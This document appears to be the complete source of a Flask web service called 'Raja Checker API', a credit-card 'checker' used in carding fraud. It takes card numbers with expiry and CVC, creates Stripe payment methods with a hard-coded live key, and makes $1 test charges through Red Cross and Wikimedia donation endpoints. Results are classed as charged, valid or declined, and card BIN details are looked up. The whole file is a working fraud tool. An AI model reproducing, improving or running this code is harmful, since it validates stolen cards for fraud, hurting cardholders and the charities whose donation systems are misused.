from flask import Flask, jsonify, request
import requests
from bs4 import BeautifulSoup
import time
import os

app = Flask(__name__)

# Global session for requests
session = requests.Session()

# Global headers for Stripe API
stripe_headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10)',
}

# Global headers for donation site
donation_headers = {
    'authority': 'www.redcross.org',
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json',
    'origin': 'https://www.redcross.org',
    'referer': 'https://www.redcross.org/donate/donation',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

# Alternative donation headers for backup site
backup_headers = {
    'authority': 'donate.wikimedia.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://donate.wikimedia.org',
    'referer': 'https://donate.wikimedia.org/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

def check_card(cc_data):
    """Check credit card using the donation gateway"""
    try:
        # Handle URL encoding - convert %7C back to |
        import urllib.parse
        cc_data = urllib.parse.unquote(cc_data)
        
        # Parse card data
        parts = cc_data.strip().split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "Invalid card format. Use: number|mm|yy|cvc"}
        
        n, mm, yy, cvc = parts
        
        # Fix year format
        if "20" in yy:
            yy = yy.split("20")[1]

        # 1. Create payment method with Stripe
        stripe_data = f"type=card&billing_details[name]=Raja+Kumar&billing_details[email]=raja.checker%40gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=Main+Street&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[phone]=2747548742&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr"

        res1 = session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
        
        if res1.status_code != 200:
            return {"status": "error", "message": "Stripe API error"}
        
        payment_data = res1.json()
        pm_id = payment_data.get("id")
        
        if not pm_id:
            error_msg = payment_data.get("error", {}).get("message", "Unknown Stripe error")
            return {"status": "declined", "message": error_msg, "response": "Card Declined"}

        # 2. Try Red Cross donation (actually processes charges)
        redcross_data = {
            "amount": 1.00,
            "frequency": "one-time",
            "payment_method": {
                "id": pm_id,
                "type": "card"
            },
            "donor": {
                "first_name": "Raja",
                "last_name": "Kumar", 
                "email": "raja.checker@gmail.com",
                "address": {
                    "line1": "123 Main St",
                    "city": "New York",
                    "state": "NY",
                    "postal_code": "10001",
                    "country": "US"
                },
                "phone": "5551234567"
            },
            "designation": "general"
        }

        res2 = session.post("https://www.redcross.org/api/donations", headers=donation_headers, json=redcross_data)
        
        # If Red Cross fails, try Wikipedia as backup
        if res2.status_code != 200:
            wiki_data = {
                'amount': '1.00',
                'currency': 'USD',
                'payment_method': 'cc',
                'payment_token': pm_id,
                'first_name': 'Raja',
                'last_name': 'Kumar',
                'email': 'raja.checker@gmail.com',
                'street_address': '123 Main St',
                'city': 'New York',
                'state_province': 'NY',
                'postal_code': '10001',
                'country': 'US',
                'gateway': 'stripe'
            }
            
            res2 = session.post("https://donate.wikimedia.org/api/v1/donate", headers=backup_headers, data=wiki_data)
        
        if res2.status_code != 200:
            return {"status": "error", "message": "Donation API error"}

        try:
            json_data = res2.json()
            
            # Handle Red Cross API responses
            if json_data.get("success") == True or json_data.get("status") == "success":
                return {"status": "charged", "message": "Payment successful - $1 charged to Red Cross", "response": "Charged $1 - RED CROSS"}
            elif json_data.get("donation_id") or json_data.get("transaction_id"):
                return {"status": "charged", "message": "Payment successful - $1 charged to charity", "response": "Charged $1 - WIKIPEDIA"}
            elif "error" in json_data:
                error_msg = str(json_data.get("error", "Payment failed"))
                if "requires_action" in error_msg.lower() or "authentication" in error_msg.lower():
                    return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV"}
                elif "insufficient" in error_msg.lower():
                    return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN - INSUFFICIENT FUNDS"}
                elif "incorrect" in error_msg.lower() and ("cvc" in error_msg.lower() or "cvv" in error_msg.lower()):
                    return {"status": "declined", "message": "CVC is incorrect", "response": "CVC INCORRECT ❌"}
                else:
                    return {"status": "declined", "message": error_msg, "response": "Card Declined"}
            else:
                # Check for other success indicators
                response_text = str(json_data).lower()
                if any(word in response_text for word in ["success", "completed", "processed", "thank"]):
                    return {"status": "charged", "message": "Payment successful - $1 charged", "response": "Charged $1"}
                else:
                    return {"status": "declined", "message": "Payment failed", "response": "Card Declined"}
                
        except:
            # If not JSON, check text response
            response_text = res2.text.lower()
            if any(word in response_text for word in ["success", "thank", "completed", "processed"]):
                return {"status": "charged", "message": "Payment successful - $1 charged", "response": "Charged $1"}
            elif "requires_action" in response_text or "authentication" in response_text:
                return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV"}
            elif "insufficient" in response_text:
                return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN - INSUFFICIENT FUNDS"}
            else:
                return {"status": "declined", "message": "Payment failed", "response": "Card Declined"}

    except Exception as e:
        return {"status": "error", "message": f"Processing error: {str(e)}"}

def get_bin_info(bin_number):
    """Get BIN information for the card"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

@app.route('/')
def home():
    return jsonify({
        "service": "🔥 Raja Checker API 🔥",
        "gateway": "Auto Stripe $1 Charge",
        "status": "✅ Online",
        "made_by": "Raja"
    })

@app.route('/gateway=<gateway>/key=<key>/site=<site>/cc=<cc>')
def check_cc(gateway, key, site, cc):
    """Main API endpoint for checking credit cards"""
    
    # Validate key
    if key != "rajachecker":
        return jsonify({
            "status": "error",
            "message": "Invalid API key",
            "gateway": gateway,
            "site": site,
            "key": key
        }), 401
    
    # Validate gateway
    if gateway != "autostripe":
        return jsonify({
            "status": "error", 
            "message": "Unsupported gateway",
            "gateway": gateway,
            "supported": ["autostripe"]
        }), 400
    
    start_time = time.time()
    
    # Check the card
    result = check_card(cc)
    
    # Get BIN info
    bin_info = get_bin_info(cc.split("|")[0][:6])
    
    # Calculate processing time
    processing_time = round(time.time() - start_time, 2)
    
    # Format response
    response = {
        "card": cc,
        "gateway": "Auto Stripe $1 Charge",
        "site": site,
        "status": result["status"],
        "response": result.get("response", result["message"]),
        "message": result["message"],
        "time": f"{processing_time}s",
        "bin_info": {
            "bank": bin_info.get("bank", "N/A"),
            "brand": bin_info.get("brand", "N/A"),
            "type": bin_info.get("type", "N/A"),
            "level": bin_info.get("level", "N/A"),
            "country": bin_info.get("country_name", "N/A"),
            "flag": bin_info.get("country_flag", "N/A")
        },
        "checked_by": "Raja Checker API",
        "api_key": key
    }
    
    return jsonify(response)

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Raja Checker API",
        "gateway": "Auto Stripe",
        "uptime": "24/7"
    })

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
